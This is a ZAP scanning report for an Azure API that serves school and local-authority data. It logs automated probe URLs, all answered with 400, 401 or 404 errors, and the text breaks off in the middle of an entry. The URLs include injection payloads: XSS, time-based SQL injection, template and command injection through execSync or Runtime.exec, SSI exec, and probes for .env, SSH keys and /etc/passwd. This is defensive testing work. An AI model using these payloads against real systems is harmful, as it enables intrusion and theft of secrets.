# ZAP Scanning Report

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 0 |
| Medium | 0 |
| Low | 1 |
| Informational | 4 |




## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| Unexpected Content-Type was returned | Low | 2 |
| A Client Error response code was returned by the server | Informational | 1429 |
| Non-Storable Content | Informational | 9 |
| Re-examine Cache-control Directives | Informational | 2 |
| Storable and Cacheable Content | Informational | 2 |




## Alert Detail



### [ Unexpected Content-Type was returned ](https://www.zaproxy.org/docs/alerts/100001/)



##### Low (High)

### Description

A Content-Type of text/html was returned by the server.
This is not one of the types expected to be returned by an API.
Raised by the 'Alert on Unexpected Content Types' script

* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/actuator/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/latest/meta-data/%3Fnames=names
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``

Instances: 2

### Solution



### Reference




#### Source ID: 4

### [ A Client Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Informational (High)

### Description

A response code of 401 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/._darcs
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.bzr
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.DS_Store
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.git/config
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.hg
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.idea/WebServers.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.php_cs.cache
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.ssh/id_dsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.ssh/id_rsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.svn/entries
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/.svn/wc.db
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/3038059443683897312
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/_framework/blazor.boot.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/_wpeprivate/config.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/adminer.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/425975554397505316
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/8036173871265121659
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/actuator/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 400`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/actuator/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=%253Cscript%253Ealert(1&29%253C/script%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=javascript:alert(1&29
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names&class.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/suggest%3Fnames=names%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authorities%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/6276612534176126782
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/local-authority%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/786040396627341184
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/1778730378932837552
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/comparators%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/school%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/3514324689030783773
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cscript%253Ealert(1&29%253C/script%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=javascript:alert(1&29
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns&class.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%252Bresponse.write%2528105%252C410*297%252C494%2529%252B%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2522java.lang.Thread.sleep%2522%252815000%2529&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2523%257B%2525x%2528sleep+15%2529%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527%2528&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%252F%252F980414377652208366.owasp.org&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%252Fetc%252Fpasswd&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%252Fschools&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
